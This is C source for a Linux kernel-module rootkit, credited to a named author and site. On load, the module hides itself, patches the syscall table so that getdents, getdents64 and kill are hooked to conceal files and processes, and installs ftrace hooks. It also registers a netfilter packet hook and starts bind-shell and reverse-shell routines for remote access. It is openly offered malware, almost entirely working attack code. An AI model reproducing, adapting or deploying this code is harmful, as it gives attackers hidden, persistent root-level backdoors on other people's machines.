#include "includes/bds_ftrace_hooks.c"

static int bds_start(void) {
        int err;

        bds_hide();
        sys_call_table = get_syscall_table();
        if (!sys_call_table) {
                printk("[-] exit");
                return -1;
        }
        cr0 = read_cr0();
        orig_getdents = (t_syscall)sys_call_table[__NR_getdents];
        orig_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];
        orig_kill = (t_syscall)sys_call_table[__NR_kill];
        
        err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        unprotect_memory();
        sys_call_table[__NR_getdents] = (unsigned long) bds_getdents;
        sys_call_table[__NR_getdents64] = (unsigned long) bds_getdents64;
        sys_call_table[__NR_kill] = (unsigned long) bds_kill;
        protect_memory();
        nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
        nfho->hook  = (nf_hookfn*)bds_nf_hook;      
        nfho->hooknum   = NF_INET_PRE_ROUTING;     
        nfho->pf    = PF_INET;          
        nfho->priority  = NF_IP_PRI_FIRST;      
        nf_register_net_hook(&init_net, nfho);
        INIT_WORK(&do_umode_exec, bds_reverse_shell);
        INIT_WORK(&do_work_bind, bds_bindshell);
        schedule_work(&do_work_bind);

        return 0;
}

static void bds_end(void) {
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
        unprotect_memory();
        sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
        sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
        sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    
        protect_memory();
        nf_unregister_net_hook(&init_net, nfho);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Antonius - www.bluedragonsec.com");
module_init(bds_start);
module_exit(bds_end);
